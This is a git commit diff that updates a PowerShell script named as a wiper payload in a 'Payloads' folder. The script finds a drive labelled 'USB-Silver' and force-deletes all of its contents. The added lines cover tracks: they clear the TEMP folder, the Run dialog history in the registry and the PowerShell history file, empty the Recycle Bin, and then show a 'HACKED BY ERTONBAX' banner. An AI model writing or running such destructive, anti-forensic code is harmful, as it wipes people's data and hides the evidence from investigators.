8f22a3786fffb969b2c15d92f9cc21079722b669
Ertonbax <marcus.schuier.ms@gmail.com>
2026-08-09 15:08:53 +0200

    Wiper.ps1
    Updated Wiper Payload.

--- Payloads/Wiper.ps1
+++ Payloads/Wiper.ps1
@@ -1,8 +1,23 @@
 # 1. Looking for Harddrive called "USB-Silver"
 $target = Get-Volume | Where-Object { $_.FileSystemLabel -eq "USB-Silver" }
 
+# 2. Wiping Command
 if ($target) {
     $driveLetter = $target.DriveLetter + ":"
     Write-Host "[*] Harddrive $driveLetter detected. Wiping Harddrive..." -ForegroundColor Yellow
     Remove-Item "$driveLetter\*" -Recurse -Force -ErrorAction SilentlyContinue
 }
+
+# Removes Command from Win + R Memory
+Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
+Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+# Exit Message
+Clear-Host
+Write-Host "==========================================" -ForegroundColor Red
+Write-Host "          HACKED BY ERTONBAX              " -ForegroundColor Yellow -BackgroundColor Black
+Write-Host "==========================================" -ForegroundColor Red
+Start-Sleep -Seconds 3
+Exit
